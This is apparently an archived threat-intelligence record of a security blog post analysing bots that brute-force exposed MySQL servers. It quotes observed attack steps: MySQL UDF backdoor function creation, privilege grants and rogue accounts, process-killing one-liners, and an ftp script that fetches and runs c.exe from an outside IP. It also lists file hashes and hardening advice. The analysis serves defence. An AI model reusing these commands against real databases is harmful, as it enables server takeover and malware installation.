{
    "id": "25c19fd6-bb17-41fe-b508-19a84f23d94d",
    "created_at": "2023-01-12T15:03:17.456701Z",
    "updated_at": "2025-03-27T02:08:42.794899Z",
    "deleted_at": null,
    "sha1_hash": "bd9b421fe1a32f491189094c58deee9be581c9d5",
    "title": "2021-10-14 - A Handshake with MySQL Bots",
    "authors": "",
    "file_creation_date": "2022-05-29T10:38:57Z",
    "file_modification_date": "2022-05-29T10:38:57Z",
    "file_size": 993977,
    "plain_text": "# A Handshake with MySQL Bots\n\n**[trustwave.com/en-us/resources/blogs/spiderlabs-blog/handshake-with-mysql-bots/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/handshake-with-mysql-bots/)**\n\n## Edge Services\n\nIt’s well known that we just don’t put services or devices on the edge of the Internet without\nstrong purpose justification. Services, whether maintained by end-users or administrators,\nhave a ton of security challenges. Databases belong to a group that often needs direct\naccess to the Internet - no doubt that security requirements are a priority here.\n\nIn this article, we will focus on the database sector, specifically MySQL, and one of the\ncommon and harmful threats that lurk on the Internet.\n\nBots are a well-known threat on the Internet. These lazy programs constantly check\nwhether there is an available MySQL service on the standard TCP/3306 port. Lazy\nbecause, in our case, there were about 20-30 login attempts once per day or a few. After\ndetecting an available database instance, the bot tries bruteforce administrator credentials.\n[Internet scanner service binaryegde.io reports over 4.2 million available devices that have](https://app.binaryedge.io/services/query)\nbeen recognized as MySQL service.\n\n## The Honeypot\n\n\n-----\n\nTo take a closer look at the situation, I created two MySQL and MariaDB servers in fairly\nnew releases (one after another). I wanted to find out what techniques and methods\nattackers are currently using to escalate rights and take control of the server and find out\ntheir purpose.\n\nThe honeypot was available for over a month on a standard TCP/3306 port with a fake root\naccount and an easy-to-guess password. I configured the root account in such a way that\nthe bot would not do any damage once logged in. Permissions on that account were very\nlow but not minimal. Except for enabled event logging, the rest of the configuration was\ndefault. I also created a few databases (besides standard 'mysql', 'test', etc.) along with\ntables to create a realistic production environment.\n\n## Guests\n\nI didn’t observe many login attempts during the first period until the honeypot IP was listed\non Shodan in the “product:mysql” search results.\n\nI observed 24 unique IP addresses throughout honeypot operation. During the analysis, it\nturned out that some addresses were related. For example, some addresses simply\ndisappeared after a successful bruteforce, and then, after some time connection from new\nIP managed to log in at the first attempt.\n\n**Actor #1**\n\nYongger is a well-known bot that has been active on the Internet for many years. Yongger\n(in Chinese - brave) uses two methods, respectively for Windows and Linux servers.\nDespite the fact that Yongger checks the operating system, it still performs both operations\n'blindly', so we observe attempts to run Windows PE files (like DLL, EXE) on Linux system,\netc.\n\nMethod 1 (for Windows)\n\nAfter guessing the password, the bot collects server information, turns off [autocommit](https://dev.mysql.com/doc/refman/8.0/en/commit.html)\n[mode, and places a hexed UDF malicious plugin (DLL) in the 'a' variable.](https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss)\n\nMySQL [User Defined Functions (UDF) allows you to create your very own functionality and](https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss)\nuse that inside the MySQL. Bots use this method to call shellcode or act as a backdoor.\n\n\n-----\n\nThe [SELECT… INTO DUMPFILE clause creates cna12.dll (other variants: nusql.dll,](https://mariadb.com/kb/en/select-into-dumpfile/)\nbincna12.dll) in the plugins directory. The function [DUMPFILE is executed in two slightly](https://mariadb.com/kb/en/select-into-dumpfile/)\nchanged variants. However, to be able to create a file using the following method, the user\nmust have [FILE privilege granted, and the mysqld process must have WRITE access to the](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file)\ndesignated directory (further adjustments can be required depending on MySQL version\nand configuration).\n\n[CREATE FUNCION calls xpdl3() function, which downloads the target backdoor -](https://dev.mysql.com/doc/refman/8.0/en/enterprise-encryption-installation.html)\nisetup.exe (another variant: asetup.exe) and saves it in the root directory of the C:\\ drive.\n\nDROP commands remove auxiliary tables and functions, hiding traces of malicious activity.\n\nMethod 2 (for Windows)\n\nThe next method prepares (3x DROP) environment for the next attack and places another\n[hex-encoded UDF malicious plugin. This time the payload is much bigger than the previous](https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss)\none.\n\n[Function DUMPFILE creates a y.exe on the C drive and puts another hexed payload in the](https://mariadb.com/kb/en/select-into-dumpfile/)\n'a' variable.\n\n\n-----\n\nThe new plugin-backdoor (amd.dll) is placed in multiple locations and then used by\n[CREATE FUNCTION to create the amdshelv() function, which name reveals its purpose.](https://dev.mysql.com/doc/refman/8.0/en/enterprise-encryption-installation.html)\n\nThe bot now tries to stop the ‘sharedaccess’ Windows service, then creates a ge.dat script\nfor the ftp client and runs it: ftp -s: ge.dat. We can see the ftp credentials 123/123 that are\nused. Here is a more readable form:\n\ncmd.exe cmd/c net stop sharedaccess\n\necho open 103.206.21.89>>ge.dat\n\necho 123>>ge.dat\n\necho 123>>ge.dat\n\necho bin>>ge.dat\n\necho get c.exe\n\nge.dat\n\necho get c.exe>>ge.dat\n\necho bye>>ge.dat\n\nftp -s:ge.dat\n\nc.exe\n\nabsl.exe\n\ndel ge.dat\n\ndel y.exe\n\ndel y.exe\n\nTwo executables are called: c.exe and absl.exe, which ends the attack.\n\nI was curious about the fact that the absl.exe file appeared, which is probably a\nconsequence of executing c.exe.\n\nI was trying to get to the ftp server to poke around – all I got was a message telling me that\nthe limit of 421 active connections was reached (screenshot below). In other words, this\nattack is active and apparently successful.\n\n\n-----\n\nHTTP server (TCP/996) preview below:\n\nI visited the site two times and the number of hits has doubled over two weeks.\n\nMethod 2 (for Linux)\n\n\n-----\n\nFollowing variant aims the Suse Linux distribution. In order to make an access to the\n[system shell, the bot trying to run one of the possible legit UDF plugins, hoping it exists:](https://github.com/mysqludf/lib_mysqludf_sys)\n\nCREATE FUNCTION sys_eval RETURNS string SONAME 'mysqludf.so'\n\nCREATE FUNCTION sys_eval RETURNS string SONAME 'mysqludf64.so'\n\nCREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf.so'\n\nCREATE FUNCTION sys_eval RETURNS string SONAME 'udf.so'\n\nCREATE FUNCTION sys_eval RETURNS string SONAME 'xiaoji64.so'\n\nCREATE FUNCTION sys_eval RETURNS string SONAME 'xiaoji.so'\n\nCREATE FUNCTION sys_eval RETURNS string SONAME 'liunx32.so'\n\ncreate function sys_eval RETURNS string SONAME 'liunx64.so'\n\nCREATE FUNCTION sys_eval returns string soname \"lib_mysqludf_sys.so\"\n\nSimilar to the previous actions, the bot downloads a malicious executable named ‘mysqld’\n(other variants: lisnu, ssyn) from the same address and tries to run it after the firewall\n(iptables and reSuSEfirewall2) services are stopped. It does this in two ways, one after\nanother.\n\n**Actor #2**\n\nThe following attack is more interesting. There are more steps than just trying to upload and\nrun an executable in various ways. Many similarities may suggest that this is an improved\nversion of Yongger, but there are exceptions. However, it is certain that the bot which\nmaking connections from that address already knew credentials - the first connection to the\nserver was authenticated right away.\n\nThe bot immediately tries to grant all possible permissions to the root account (which we’re\ncurrently using) and creates new accounts: server and mysqld.\n\nGRANT ALTER, ALTER ROUTINE, CREATE, CREATE ROUTINE, CREATE TEMPORARY\nTABLES, CREATE USER, CREATE VIEW, DROP, EVENT, EXECUTE, FILE, INDEX, LOCK\nTABLES, PROCESS, REFERENCES, RELOAD, REPLICATION CLIENT, REPLICATION\n\n\n-----\n\nSLAVE, SHOW DATABASES, SHOW VIEW, SHUTDOWN, SUPER, TRIGGER ON . TO\n'root'@'%' WITH GRANT OPTION\n\ninsert into mysql.user(Host,User,Password) values(\"%\",\"server\",password(\"123456*a\"))\n\nCREATE USER 'mysqld'@'%' IDENTIFIED BY '123456*a'\n\n[After user creation attempts bot enables global variables log_bin_trust_function_creators](https://dev.mysql.com/doc/refman/8.0/en/replication-options-binary-log.html#sysvar_log_bin_trust_function_creators)\n[and (outdated) log_bin_trust_routine_creators in order to use the CREATE FUNCION more](https://dev.mysql.com/doc/refman/8.0/en/enterprise-encryption-installation.html)\nreliable.\n\n[Then updates max_allowed_packet variable to prepare for a bigger chunk of payload:](https://dev.mysql.com/doc/refman/8.0/en/packet-too-large.html)\n\nset global log_bin_trust_function_creators=1\n\nset global log_bin_trust_function_creators=TRUE\n\nSET GLOBAL log_bin_trust_routine_creators=1\n\nmax_allowed_packet=1073741824\n\n[Further steps look the same as before, where clause SELECT… INTO DUMPFILE was](https://mariadb.com/kb/en/select-into-dumpfile/)\nused.\n\nOther Linux activity:\n\nWe can see here attempts of killing many processes, starting from lz1:\n\n\n-----\n\nps -ef | grep lz1|grep -v grep|cut -c 9-15|xargs kill -9\n\nThis is a substitute of a combination pidof and pkill commands. Then continue by killing\nprocesses: .sshd, .ssh, and1, cisco, ciscoh, L24 and L26 – preparing the ground for a new\nattack.\n\nThere is also an interesting way of killing processes. Perhaps the same processes, but this\ntime by their TCP ports:\n\nkill str=`netstat -anept 2>/dev/null |grep -E ':\n(68866|7583|2222|10711|6009|10991|10771|7168|7668|36000|36001|25000|25001|25002)'|cut\n-d / -f 1`\n\n## IOCs\n\nWindows PE:\n\n**Filename(s)** **Description** **MD5**\n\ncna12.dll / bincna12.dll backdoor a922d55a873d4ad0bbbbbc8147a3a65a\n\namd.dll backdoor f8d1e5274de567e1b98c6d3d90eb6a3f\n\nnusql.dll backdoor 9c9a70db100822a398d9d5c4fcc82193\n\n\ny.exe / c.exe / 360.exe /\nisetup.exe / asetup.exe\n\nLinux ELF:\n\n\nbackdoor c71eacf3ffaf82787a533eb452bcf3e7\n\n\n**Filename(s)** **Description** **MD5**\n\n\nymqynd32.so /\nlib_mysqludf_sys.so\n\n\nlegit UDF e3a5eed3b2152ce6bfc5417ec001ced8\n\n\nssyn backdoor a011ae821ae822bade7ef4f396dcc20c\n\n## Summary\n\n\n-----\n\nAs the analysis shows, the bots, in this case, are not particularly aggressive. They don t\noverload the network or force your credentials in hundreds of thousands of tries to get\ninside. Slowly checking popular passwords can sometimes get the desired effect.\n\nAlthough I didn’t observe any activity indicating that the attacker was downloading files,\ndatabases, or attempts to encrypt a drive (ransomware), the main goal of the attack was to\ntake control of the server (partial or complete) and establish a CNC channel.\n\nLooking at the numbers, over 1200 times the backdoor was downloaded, or 421 active ftp\nconnections did not allow logging in - it proves only that despite such simple tricks, the\nattack often succeeds.\n\nIt's certainly not a threat to well-administered databases, but we should definitely pay\nattention to details such as installed UDF plugins, directory owner and privileges, accounts,\nand their hosts - 'root'@'%' vs 'root'@'localhost', and many more.\n\nTo protect yourself from this type of attack, you will most likely need to use a custom (nonstandard) administrator name and remove the root account. Using a long and complex\npassword is an absolute requirement. It is a good practice to implement a password policy\n(if you’re an organization), use plugins that will take care of the password complexity level,\n[password validity period, etc., and periodically do database security audits.](https://www.trustwave.com/en-us/services/database-security/appdetectivepro/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-14 - A Handshake with MySQL Bots.pdf"
    ],
    "report_names": [
        "2021-10-14 - A Handshake with MySQL Bots.pdf"
    ],
    "threat_actors": [
        {
            "id": "dcba8e2b-93e0-4d6e-a15f-5c44faebc3b1",
            "created_at": "2022-10-25T16:07:23.816991Z",
            "updated_at": "2025-03-27T02:02:09.991944Z",
            "deleted_at": null,
            "main_name": "Lurk",
            "aliases": [],
            "source_name": "ETDA:Lurk",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535797,
    "ts_updated_at": 1743041322,
    "ts_creation_date": 1653820737,
    "ts_modification_date": 1653820737,
    "files": {
        "pdf": "https://archive.orkl.eu/bd9b421fe1a32f491189094c58deee9be581c9d5.pdf",
        "text": "https://archive.orkl.eu/bd9b421fe1a32f491189094c58deee9be581c9d5.txt",
        "img": "https://archive.orkl.eu/bd9b421fe1a32f491189094c58deee9be581c9d5.jpg"
    }
}